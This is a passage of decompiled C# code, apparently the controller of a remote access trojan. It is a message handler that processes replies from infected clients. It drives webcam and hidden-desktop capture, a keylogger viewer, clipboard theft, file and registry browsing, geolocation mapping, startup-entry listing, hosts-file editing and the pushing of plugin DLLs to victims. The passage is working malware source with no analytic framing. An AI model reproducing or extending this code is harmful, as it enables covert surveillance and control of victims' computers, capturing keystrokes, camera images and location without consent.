															webCam2.FPS = 0;
															webCam2.sw = Stopwatch.StartNew();
														}
														bool flag57 = webCam2.ToolStripStatusLabel4.ForeColor == Color.Green;
														if (flag57)
														{
															webCam2.save(memoryStream2);
														}
														bool flag58 = Operators.CompareString(webCam2.Guna2GradientButton1.Text, "Stop", false) == 0;
														if (flag58)
														{
															byte[] state = Helper.SB(string.Concat(new string[]
															{
																"Cam",
																SettingsHelper.SPL,
																webCam2.Guna2ComboBox2.SelectedIndex.ToString(),
																SettingsHelper.SPL,
																webCam2.Guna2ComboBox1.Text.Replace("%", "").ToString()
															}));
															Messages._Closure$__R5-3 CS$<>8__locals1 = new Messages._Closure$__R5-3(CS$<>8__locals1);
															CS$<>8__locals1.$VB$NonLocal_5 = C;
															ThreadPool.QueueUserWorkItem(delegate(object a0)
															{
																CS$<>8__locals1.$VB$NonLocal_5.BeginSend((byte[])a0);
															}, state);
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "Hash", false) == 0)
									{
										bool invokeRequired28 = Messages.F.InvokeRequired;
										if (invokeRequired28)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Hash hash = (Hash)MyProject.Application.OpenForms[string.Concat(new string[]
											{
												"File Hash : ",
												array[1],
												" (",
												array[3],
												")"
											})];
											bool flag59 = hash == null;
											if (flag59)
											{
												new Hash
												{
													C = C,
													Name = string.Concat(new string[]
													{
														"File Hash : ",
														array[1],
														" (",
														array[3],
														")"
													}),
													Text = string.Concat(new string[]
													{
														"File Hash : ",
														array[1],
														" (",
														array[3],
														")"
													})
												}.Show();
											}
											try
											{
												Hash hash2 = (Hash)MyProject.Application.OpenForms[string.Concat(new string[]
												{
													"File Hash : ",
													array[1],
													" (",
													array[3],
													")"
												})];
												hash2.Text = string.Concat(new string[]
												{
													"File Hash : ",
													array[1],
													" (",
													array[3],
													")"
												});
												hash2.Guna2TextBox1.Text = array[2];
											}
											catch (Exception ex5)
											{
											}
										}
									}
								}
								else if (Operators.CompareString(text, "HApps+", false) == 0)
								{
									bool invokeRequired29 = Messages.F.InvokeRequired;
									if (invokeRequired29)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										HApps happs2 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
										bool flag60 = happs2 != null;
										if (flag60)
										{
											string text10 = array[2];
											bool flag61 = text10.Length > 0;
											if (flag61)
											{
												MemoryStream stream = new MemoryStream(Helper.Decompress(Convert.FromBase64String(text10)));
												Bitmap bitmap = (Bitmap)Image.FromStream(stream);
												happs2.PictureBox1.Image = bitmap;
												happs2.rdSize = bitmap.Size;
												HApps happs3 = happs2;
												ref int ptr = ref happs3.FPS;
												happs3.FPS = ptr + 1;
												bool flag62 = happs2.sw.ElapsedMilliseconds >= 1000L;
												if (flag62)
												{
													happs2.Text = string.Concat(new string[]
													{
														"Hidden Apps : ",
														array[1],
														"  FPS:",
														happs2.FPS.ToString(),
														"  Size:",
														Helper.BytesToString(unchecked((long)b.Length))
													});
													happs2.FPS = 0;
													happs2.sw = Stopwatch.StartNew();
												}
											}
											bool flag63 = Operators.CompareString(happs2.Guna2GradientButton1.Text, "Capturing...", false) == 0;
											if (flag63)
											{
												byte[] state2 = Helper.SB("HApps+" + SettingsHelper.SPL + happs2.Guna2ComboBox1.Text.Replace("%", "").ToString());
												Messages._Closure$__R5-5 CS$<>8__locals2 = new Messages._Closure$__R5-5(CS$<>8__locals2);
												CS$<>8__locals2.$VB$NonLocal_7 = C;
												ThreadPool.QueueUserWorkItem(delegate(object a0)
												{
													CS$<>8__locals2.$VB$NonLocal_7.BeginSend((byte[])a0);
												}, state2);
											}
										}
									}
								}
							}
							else if (num != 1344786527U)
							{
								if (num != 1688872456U)
								{
									if (num == 1714821179U)
									{
										if (Operators.CompareString(text, "FilesSearcher", false) == 0)
										{
											bool invokeRequired30 = Messages.F.InvokeRequired;
											if (invokeRequired30)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												FilesSearcher filesSearcher = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
												bool flag64 = filesSearcher != null;
												if (flag64)
												{
													C.isDisconnected();
												}
												else
												{
													bool flag65 = filesSearcher == null;
													if (flag65)
													{
														new FilesSearcher
														{
															C = C,
															Name = "Files Searcher : " + array[1],
															Text = "Files Searcher : " + array[1]
														}.Show();
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "MBoxErr", false) == 0)
								{
									bool invokeRequired31 = Messages.F.InvokeRequired;
									if (invokeRequired31)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										MBox mbox2 = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
										bool flag66 = mbox2 != null;
										if (flag66)
										{
											mbox2.ToolStripStatusLabel1.ForeColor = Color.Red;
											mbox2.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (Operators.CompareString(text, "GetClipboard", false) == 0)
							{
								bool invokeRequired32 = Messages.F.InvokeRequired;
								if (invokeRequired32)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Clipboard clipboard = (Clipboard)MyProject.Application.OpenForms["Clipboard : " + array[2]];
									bool flag67 = clipboard != null;
									if (flag67)
									{
										clipboard.RichTextBox1.Text = array[1];
									}
								}
							}
						}
						else if (num <= 1911311572U)
						{
							if (num <= 1774487270U)
							{
								if (num != 1760795057U)
								{
									if (num == 1774487270U)
									{
										if (Operators.CompareString(text, "WindowsList", false) == 0)
										{
											bool invokeRequired33 = Messages.F.InvokeRequired;
											if (invokeRequired33)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												HApps happs4 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
												bool flag68 = happs4 != null;
												if (flag68)
												{
													happs4.ListView1.Items.Clear();
													happs4.ImageList1.Images.Clear();
													string[] array6 = array[2].Split(new string[]
													{
														"-==>"
													}, StringSplitOptions.None);
													int num9 = array6.Length - 1;
													for (int num10 = 0; num10 <= num9; num10++)
													{
														bool flag69 = array6[num10].Length > 0;
														if (flag69)
														{
															ListViewItem listViewItem4 = new ListViewItem();
															listViewItem4.Text = new FileInfo(array6[num10]).Name;
															listViewItem4.SubItems.Add(array6[num10 + 3]);
															Image image3 = Image.FromStream(new MemoryStream(Convert.FromBase64String(array6[num10 + 2])));
															happs4.ImageList1.Images.Add(array6[num10 + 1], image3);
															listViewItem4.ImageKey = array6[num10 + 1];
															listViewItem4.ToolTipText = array6[num10];
															happs4.ListView1.Items.Add(listViewItem4);
														}
														num10 += 3;
													}
													happs4.ToolStripStatusLabel1.Text = "Apps [" + happs4.ListView1.Items.Count.ToString() + "]";
													happs4.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "Clipboard", false) == 0)
								{
									bool invokeRequired34 = Messages.F.InvokeRequired;
									if (invokeRequired34)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										Clipboard clipboard2 = (Clipboard)MyProject.Application.OpenForms["Clipboard : " + array[1]];
										bool flag70 = clipboard2 != null;
										if (flag70)
										{
											C.isDisconnected();
										}
										else
										{
											bool flag71 = clipboard2 == null;
											if (flag71)
											{
												new Clipboard
												{
													C = C,
													Name = "Clipboard : " + array[1],
													Text = "Clipboard : " + array[1]
												}.Show();
											}
										}
									}
								}
							}
							else if (num != 1803512071U)
							{
								if (num != 1873850686U)
								{
									if (num == 1911311572U)
									{
										if (Operators.CompareString(text, "sendPlugin", false) == 0)
										{
											bool invokeRequired35 = Messages.F.InvokeRequired;
											if (invokeRequired35)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												Helper.LVLog("Sending the plugin to client " + C.IP.Split(new char[]
												{
													':'
												})[0] + " for the first time please wait..", Color.RoyalBlue);
												foreach (string text11 in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
												{
													bool flag72 = Operators.CompareString(array[1], Helper.GetChecksum(text11), false) == 0;
													if (flag72)
													{
														byte[] state3 = Helper.SB(string.Concat(new string[]
														{
															"savePlugin",
															SettingsHelper.SPL,
															array[1],
															SettingsHelper.SPL,
															Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(text11)))
														}));
														Messages._Closure$__R5-8 CS$<>8__locals3 = new Messages._Closure$__R5-8(CS$<>8__locals3);
														CS$<>8__locals3.$VB$NonLocal_10 = C;
														ThreadPool.QueueUserWorkItem(delegate(object a0)
														{
															CS$<>8__locals3.$VB$NonLocal_10.BeginSend((byte[])a0);
														}, state3);
														Helper.LVLog("Plugin " + Path.GetFileName(text11) + " sent to " + C.IP.Split(new char[]
														{
															':'
														})[0], Color.RoyalBlue);
														break;
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "FilesSearcherErr", false) == 0)
								{
									bool invokeRequired36 = Messages.F.InvokeRequired;
									if (invokeRequired36)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										FilesSearcher filesSearcher2 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
										bool flag73 = filesSearcher2 != null;
										if (flag73)
										{
											filesSearcher2.Guna2GradientButton1.Enabled = true;
											filesSearcher2.ToolStripStatusLabel1.ForeColor = Color.Red;
											filesSearcher2.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (Operators.CompareString(text, "ppp", false) == 0)
							{
								bool invokeRequired37 = Messages.F.InvokeRequired;
								if (invokeRequired37)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									ProcessV processV2 = (ProcessV)MyProject.Application.OpenForms["Process Manager : " + array[1]];
									bool flag74 = processV2 != null;
									if (flag74)
									{
										C.isDisconnected();
									}
									else
									{
										bool flag75 = processV2 == null;
										if (flag75)
										{
											new ProcessV
											{
												C = C,
												Name = "Process Manager : " + array[1],
												Text = "Process Manager : " + array[1]
											}.Show();
										}
									}
								}
							}
						}
						else if (num <= 2047146230U)
						{
							if (num != 1963363740U)
							{
								if (num != 2027532501U)
								{
									if (num == 2047146230U)
									{
										if (Operators.CompareString(text, "RG", false) == 0)
										{
											bool invokeRequired38 = Messages.F.InvokeRequired;
											if (invokeRequired38)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												Registry registry2 = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
												bool flag76 = registry2 != null;
												if (flag76)
												{
													string left = array[2];
													if (Operators.CompareString(left, "~", false) == 0)
													{
														registry2.RGk.Enabled = true;
														registry2.RGk.SelectedNode.Nodes.Clear();
														registry2.ListView1.Items.Clear();
														registry2.ToolStripProgressBar1.Value = 0;
														registry2.ToolStripProgressBar1.Maximum = array.Length - 3;
														int num12 = array.Length - 1;
														for (int num13 = 4; num13 <= num12; num13++)
														{
															try
															{
																registry2.ToolStripProgressBar1 = registry2.ToolStripProgressBar1;
																ToolStripProgressBar toolStripProgressBar;
																(toolStripProgressBar = registry2.ToolStripProgressBar1).Value = toolStripProgressBar.Value + 1;
																bool flag77 = array[num13].Length > 0;
																if (flag77)
																{
																	bool flag78 = array[num13].Contains("/");
																	if (flag78)
																	{
																		string[] array7 = Strings.Split(array[num13], "/", -1, CompareMethod.Binary);
																		ListViewItem listViewItem5 = registry2.ListView1.Items.Add(array7[0]);
																		listViewItem5.SubItems.Add(array7[1]);
																		try
																		{
																			listViewItem5.SubItems.Add(array7[2]);
																		}
																		catch (Exception ex6)
																		{
																			Debug.WriteLine(ex6.Message);
																		}
																		bool flag79 = Operators.CompareString(array7[1], "String", false) == 0;
																		if (flag79)
																		{
																			listViewItem5.ImageIndex = 1;
																		}
																		else
																		{
																			listViewItem5.ImageIndex = 2;
																		}
																	}
																	else
																	{
																		registry2.RGk.SelectedNode.Nodes.Add(array[num13]);
																	}
																}
															}
															catch (Exception ex7)
															{
																Debug.WriteLine(ex7.Message);
															}
														}
														registry2.RGk.SelectedNode.Expand();
														registry2.RGk.Select();
														registry2.RGk.Focus();
														int num14 = registry2.ListView1.Columns.Count - 1;
														int num15 = 0;
														registry2.ToolStripStatusLabel1.ForeColor = Color.Black;
														while (num15 <= num14)
														{
															registry2.ListView1.Columns[num15].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
															num15++;
															registry2.ToolStripStatusLabel1.Text = "Keys [" + Conversions.ToString(registry2.ListView1.Items.Count) + "]";
														}
														registry2.ToolStripProgressBar1.Value = 0;
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "FileManagerErr", false) == 0)
								{
									bool invokeRequired39 = Messages.F.InvokeRequired;
									if (invokeRequired39)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										FM fm3 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
										bool flag80 = fm3 != null;
										if (flag80)
										{
											fm3.ToolStripStatusLabel1.ForeColor = Color.Red;
											fm3.ToolStripStatusLabel1.Visible = true;
											fm3.ToolStripStatusLabel1.Text = array[2];
										}
									}
								}
							}
							else if (Operators.CompareString(text, "GetWindows", false) == 0)
							{
								bool invokeRequired40 = Messages.F.InvokeRequired;
								if (invokeRequired40)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									ACT act2 = (ACT)MyProject.Application.OpenForms["ActiveWindows : " + array[1]];
									bool flag81 = act2 != null;
									if (flag81)
									{
										act2.ListView1.Items.Clear();
										string[] array8 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
										int num16 = array8.Length - 2;
										for (int num17 = 0; num17 <= num16; num17++)
										{
											bool flag82 = array8[num17].Length > 0;
											if (flag82)
											{
												ListViewItem listViewItem6 = new ListViewItem();
												listViewItem6.Text = array8[num17 + 1];
												listViewItem6.SubItems.Add(array8[num17]);
												listViewItem6.ImageIndex = 0;
												act2.ListView1.Items.Add(listViewItem6);
											}
											num17++;
										}
										act2.ToolStripStatusLabel2.Text = "Windows [" + Conversions.ToString(act2.ListView1.Items.Count) + "]";
										act2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
									}
								}
							}
						}
						else if (num != 2061178551U)
						{
							if (num != 2155921672U)
							{
								if (num == 2216124205U)
								{
									if (Operators.CompareString(text, "HostsMSG", false) == 0)
									{
										bool invokeRequired41 = Messages.F.InvokeRequired;
										if (invokeRequired41)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											Hosts hosts = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
											bool flag83 = hosts != null;
											if (flag83)
											{
												hosts.ToolStripStatusLabel1.ForeColor = Color.Green;
												hosts.ToolStripStatusLabel1.Text = array[2];
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "Keylogger", false) == 0)
							{
								bool invokeRequired42 = Messages.F.InvokeRequired;
								if (invokeRequired42)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms["Keylogger : " + array[1]];
									bool flag84 = keylogger != null;
									if (flag84)
									{
										C.isDisconnected();
									}
									else
									{
										bool flag85 = keylogger == null;
										if (flag85)
										{
											new Keylogger
											{
												C = C,
												CID = array[1],
												Name = "Keylogger : " + array[1],
												Text = "Keylogger : " + array[1]
											}.Show();
										}
									}
								}
							}
						}
						else if (Operators.CompareString(text, "pong", false) == 0)
						{
							bool invokeRequired43 = Messages.F.InvokeRequired;
							if (invokeRequired43)
							{
								Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
								{
									C,
									b
								});
							}
							else
							{
								object online = SettingsHelper.Online;
								lock (online)
								{
									try
									{
										bool flag87 = C.LV != null;
										if (flag87)
										{
											int num18 = Conversions.ToInteger(array[1]);
											C.LV.SubItems[Messages.F._Ping.Index].Text = Conversions.ToString(num18) + " MS";
											bool flag88 = num18 > 400;
											if (flag88)
											{
												C.LV.SubItems[Messages.F._Ping.Index].ForeColor = Color.Red;
											}
											else
											{
												bool flag89 = num18 > 200;
												if (flag89)
												{
													C.LV.SubItems[Messages.F._Ping.Index].ForeColor = Color.Orange;
												}
												else
												{
													C.LV.SubItems[Messages.F._Ping.Index].ForeColor = Color.Green;
												}
											}
										}
									}
									catch (Exception ex8)
									{
										Debug.WriteLine("pong: " + ex8.Message);
									}
								}
							}
						}
					}
					else if (num <= 3388569596U)
					{
						if (num <= 2718488809U)
						{
							if (num <= 2404479045U)
							{
								if (num <= 2218218757U)
								{
									if (num != 2218194962U)
									{
										if (num == 2218218757U)
										{
											if (Operators.CompareString(text, "SysSound", false) == 0)
											{
												bool invokeRequired44 = Messages.F.InvokeRequired;
												if (invokeRequired44)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													Sound sound2 = (Sound)MyProject.Application.OpenForms["System Sound : " + array[1]];
													bool flag90 = sound2 != null;
													if (flag90)
													{
														C.isDisconnected();
													}
													else
													{
														bool flag91 = sound2 == null;
														if (flag91)
														{
															sound2 = new Sound();
															sound2.C = C;
															sound2.Name = "System Sound : " + array[1];
															sound2.Text = "System Sound : " + array[1];
															try
															{
																sound2.waveplayer.Init(sound2.bwp);
																sound2.waveplayer.Play();
															}
															catch (Exception ex9)
															{
															}
															sound2.Show();
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "FileManager", false) == 0)
									{
										bool invokeRequired45 = Messages.F.InvokeRequired;
										if (invokeRequired45)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											FM fm4 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
											bool flag92 = fm4 != null;
											if (flag92)
											{
												bool flag93 = Operators.CompareString(array[2], "Error", false) == 0;
												if (flag93)
												{
													fm4.Guna2GradientButton4.PerformClick();
													fm4.ToolStripStatusLabel1.ForeColor = Color.Red;
													fm4.ToolStripStatusLabel1.Visible = true;
													fm4.ToolStripStatusLabel1.Text = array[3];
												}
												else
												{
													fm4.ListView1.Items.Clear();
													fm4.ImageList1.Images.Clear();
													int num19 = 0;
													int num20 = 0;
													fm4.ImageList1.Images.Add(Conversions.ToString(0), Resources.CD);
													fm4.ImageList1.Images.Add(Conversions.ToString(1), Resources.HDD);
													fm4.ImageList1.Images.Add(Conversions.ToString(2), Resources.Folder);
													fm4.ImageList1.Images.Add(Conversions.ToString(3), Resources.Network);
													fm4.ImageList1.Images.Add(Conversions.ToString(4), Resources.USB);
													string[] array9 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
													int num21 = array9.Length - 3;
													for (int num22 = 0; num22 <= num21; num22++)
													{
														ListViewItem listViewItem7 = new ListViewItem();
														listViewItem7.Text = array9[num22];
														listViewItem7.SubItems.Add(array9[num22 + 2]);
														listViewItem7.SubItems.Add("");
														listViewItem7.SubItems.Add(array9[num22 + 1]);
														bool flag94 = !listViewItem7.Text.StartsWith("[Drive]") & !listViewItem7.Text.StartsWith("[CD]") & !listViewItem7.Text.StartsWith("[Folder]") & !listViewItem7.Text.StartsWith("[USB]") & !listViewItem7.Text.StartsWith("[NET]");
														if (flag94)
														{
															long byteCount = Convert.ToInt64(listViewItem7.SubItems[3].Text);
															listViewItem7.SubItems[3].Text = Helper.BytesToString(byteCount);
															listViewItem7.Tag = Convert.ToInt64(array9[num22 + 1]);
															string text12 = Path.GetExtension(listViewItem7.Text).ToLower();
															listViewItem7.SubItems[2].Text = Helper.FilesType(listViewItem7.Text);
															bool flag95 = text12.Length < 1;
															if (flag95)
															{
																bool flag96 = !fm4.ImageList1.Images.ContainsKey("-=>");
																if (flag96)
																{
																	fm4.ImageList1.Images.Add("-=>", Helper.GetFileIcon(text12, Helper.IconSize.SHGFI_LARGEICON));
																}
																listViewItem7.ImageKey = "-=>";
															}
															else
															{
																bool flag97 = !fm4.ImageList1.Images.ContainsKey(text12);
																if (flag97)
																{
																	fm4.ImageList1.Images.Add(text12, Helper.GetFileIcon(text12, Helper.IconSize.SHGFI_LARGEICON));
																}
																listViewItem7.ImageKey = text12;
															}
															num20++;
														}
														bool flag98 = listViewItem7.Text.StartsWith("[Drive]");
														if (flag98)
														{
															listViewItem7.ImageIndex = 1;
															listViewItem7.Text = listViewItem7.Text.Substring(7);
														}
														else
														{
															bool flag99 = listViewItem7.Text.StartsWith("[CD]");
															if (flag99)
															{
																listViewItem7.ImageIndex = 0;
																listViewItem7.Text = listViewItem7.Text.Substring(4);
															}
															else
															{
																bool flag100 = listViewItem7.Text.StartsWith("[USB]");
																if (flag100)
																{
																	listViewItem7.ImageIndex = 4;
																	listViewItem7.Text = listViewItem7.Text.Substring(5);
																}
																else
																{
																	bool flag101 = listViewItem7.Text.StartsWith("[Folder]");
																	if (flag101)
																	{
																		listViewItem7.ImageIndex = 2;
																		listViewItem7.Text = listViewItem7.Text.Substring(8);
																		listViewItem7.SubItems[2].Text = "File Folder";
																		num19++;
																	}
																	else
																	{
																		bool flag102 = listViewItem7.Text.StartsWith("[NET]");
																		if (flag102)
																		{
																			listViewItem7.ImageIndex = 3;
																			listViewItem7.Text = listViewItem7.Text.Substring(5);
																		}
																	}
																}
															}
														}
														fm4.ListView1.Items.Add(listViewItem7);
														num22 += 2;
													}
													fm4.ToolStripStatusLabel2.Text = string.Concat(new string[]
													{
														"Folder[",
														num19.ToString(),
														"]   Files[",
														num20.ToString(),
														"]"
													});
													try
													{
														bool flag103 = array[3].ToString().Length > 3;
														if (flag103)
														{
															fm4.Guna2TextBox1.Text = array[3] + "\\";
														}
													}
													catch (Exception ex10)
													{
													}
													fm4.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
												}
											}
										}
									}
								}
								else if (num != 2244002770U)
								{
									if (num != 2357267357U)
									{
										if (num == 2404479045U)
										{
											if (Operators.CompareString(text, "Performance", false) == 0)
											{
												bool invokeRequired46 = Messages.F.InvokeRequired;
												if (invokeRequired46)
												{
													Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
													{
														C,
														b
													});
												}
												else
												{
													Performance performance = (Performance)MyProject.Application.OpenForms["Performance : " + array[1]];
													bool flag104 = performance != null;
													if (flag104)
													{
														C.isDisconnected();
													}
													else
													{
														bool flag105 = performance == null;
														if (flag105)
														{
															new Performance
															{
																C = C,
																Name = "Performance : " + array[1],
																Text = "Performance : " + array[1],
																Label3 = 
																{
																	Text = array[2]
																},
																Label4 = 
																{
																	Text = array[3]
																},
																Label6 = 
																{
																	Text = Conversions.ToString(Helper.CTMGORHR(Conversions.ToInteger(array[4])))
																},
																Label9 = 
																{
																	Text = array[5]
																},
																Label7 = 
																{
																	Text = array[6]
																},
																Label12 = 
																{
																	Text = array[7] + " MHz"
																}
															}.Show();
														}
													}
												}
											}
										}
									}
									else if (Operators.CompareString(text, "CompilerMSG", false) == 0)
									{
										bool invokeRequired47 = Messages.F.InvokeRequired;
										if (invokeRequired47)
										{
											Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
											{
												C,
												b
											});
										}
										else
										{
											VBCode vbcode2 = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
											bool flag106 = vbcode2 != null;
											if (flag106)
											{
												vbcode2.ToolStripStatusLabel1.ForeColor = Color.Green;
												vbcode2.ToolStripStatusLabel1.Visible = true;
												vbcode2.ToolStripStatusLabel1.Text = array[2];
											}
										}
									}
								}
								else if (Operators.CompareString(text, "Informations", false) == 0)
								{
									bool invokeRequired48 = Messages.F.InvokeRequired;
									if (invokeRequired48)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										INFO info = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
										bool flag107 = info != null;
										if (flag107)
										{
											C.isDisconnected();
										}
										else
										{
											bool flag108 = info == null;
											if (flag108)
											{
												new INFO
												{
													C = C,
													CID = array[1],
													Name = "Information : " + array[1],
													Text = "Information : " + array[1]
												}.Show();
											}
										}
									}
								}
							}
							else if (num <= 2547870228U)
							{
								if (num != 2510049970U)
								{
									if (num == 2547870228U)
									{
										if (Operators.CompareString(text, "ENCHAT", false) == 0)
										{
											bool invokeRequired49 = Messages.F.InvokeRequired;
											if (invokeRequired49)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												Chat chat2 = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
												chat2.C = C;
												chat2.chatE = true;
												chat2.Timer1.Enabled = true;
											}
										}
									}
								}
								else if (Operators.CompareString(text, "GetKeylogger", false) == 0)
								{
									bool invokeRequired50 = Messages.F.InvokeRequired;
									if (invokeRequired50)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										Keylogger keylogger2 = (Keylogger)MyProject.Application.OpenForms["Keylogger : " + array[1]];
										bool flag109 = keylogger2 != null;
										if (flag109)
										{
											keylogger2.Strb.Append(array[2]);
											keylogger2.T1.Text = keylogger2.Strb.ToString();
											keylogger2.T1.SelectionStart = keylogger2.T1.Text.Length;
											keylogger2.T1.ScrollToCaret();
											keylogger2.T1.Refresh();
										}
									}
								}
							}
							else if (num != 2580526360U)
							{
								if (num != 2654457827U)
								{
									if (num == 2718488809U)
									{
										if (Operators.CompareString(text, "RGErr", false) == 0)
										{
											bool invokeRequired51 = Messages.F.InvokeRequired;
											if (invokeRequired51)
											{
												Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
												{
													C,
													b
												});
											}
											else
											{
												Registry registry3 = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
												bool flag110 = registry3 != null;
												if (flag110)
												{
													registry3.RGk.Enabled = true;
													registry3.ToolStripStatusLabel1.ForeColor = Color.Red;
													registry3.ToolStripStatusLabel1.Text = array[2];
												}
											}
										}
									}
								}
								else if (Operators.CompareString(text, "GMapsapi", false) == 0)
								{
									bool invokeRequired52 = Messages.F.InvokeRequired;
									if (invokeRequired52)
									{
										Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
										{
											C,
											b
										});
									}
									else
									{
										Maps maps = (Maps)MyProject.Application.OpenForms["Location Manager : " + array[1]];
										bool flag111 = maps != null;
										if (flag111)
										{
											bool flag112 = Operators.CompareString(array[2], null, false) == 0;
											if (flag112)
											{
												maps.ToolStripStatusLabel1.ForeColor = Color.Red;
												maps.ToolStripStatusLabel1.Text = "Error!";
											}
											else
											{
												maps.ToolStripStatusLabel1.ForeColor = Color.Green;
												maps.ToolStripStatusLabel1.Text = array[2];
												try
												{
													maps.GMapControl1.MapProvider = GMapProviders.GoogleMap;
													maps.GMapControl1.DragButton = MouseButtons.Left;
													maps.GMapControl1.Position = new PointLatLng(Conversions.ToDouble(array[2].Split(new char[]
													{
														','
													})[0]), Conversions.ToDouble(array[2].Split(new char[]
													{
														','
													})[1]));
													GMapOverlay gmapOverlay = new GMapOverlay();
													GMarkerGoogle gmarkerGoogle = new GMarkerGoogle(new PointLatLng(Conversions.ToDouble(array[2].Split(new char[]
													{
														','
													})[0]), Conversions.ToDouble(array[2].Split(new char[]
													{
														','
													})[1])), 2);
													gmarkerGoogle.ToolTipText = string.Format("Location : " + DateTime.Now.ToLongTimeString(), new object[0]);
													maps.GMapControl1.Overlays.Add(gmapOverlay);
													gmapOverlay.Markers.Add(gmarkerGoogle);
													gmarkerGoogle.ToolTipMode = 2;
												}
												catch (Exception ex11)
												{
													Debug.WriteLine("GMapsapi: " + ex11.Message);
												}
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text, "GetStartup", false) == 0)
							{
								bool invokeRequired53 = Messages.F.InvokeRequired;
								if (invokeRequired53)
								{
									Messages.F.Invoke(new Messages._Read(Messages.Read), new object[]
									{
										C,
										b
									});
								}
								else
								{
									StartupManager startupManager2 = (StartupManager)MyProject.Application.OpenForms["Startup Manager : " + array[1]];
									bool flag113 = startupManager2 != null;
									if (flag113)
									{
										string[] array10 = Strings.Split(array[2], "-=>", -1, CompareMethod.Binary);
										int num23 = array10.Length - 1;
										for (int num24 = 0; num24 <= num23; num24++)
										{
											bool flag114 = array10[num24].Length > 0;
											if (flag114)
											{
												ListViewItem listViewItem8 = new ListViewItem();
												string text13 = array10[num24 + 1];
												listViewItem8.Text = array10[num24];
												bool flag115 = Operators.CompareString(text13, "Task", false) == 0;
												if (flag115)
												{
													listViewItem8.ImageIndex = 0;
												}
												bool flag116 = Operators.CompareString(text13, "File", false) == 0;
												if (flag116)
												{
													listViewItem8.ImageIndex = 1;
												}
												bool flag117 = Operators.CompareString(text13, "Reg", false) == 0;
												if (flag117)
												{
													listViewItem8.ImageIndex = 2;
												}
												listViewItem8.SubItems.Add(text13);
												listViewItem8.SubItems.Add(array10[num24 + 2]);
												listViewItem8.ToolTipText = array10[num24 + 3];
												startupManager2.ListView1.Items.Add(listViewItem8);
											}
											num24 += 3;
										}
										startupManager2.ToolStripStatusLabel4.Text = "Startup [" + Conversions.ToString(startupManager2.ListView1.Items.Count) + "]";
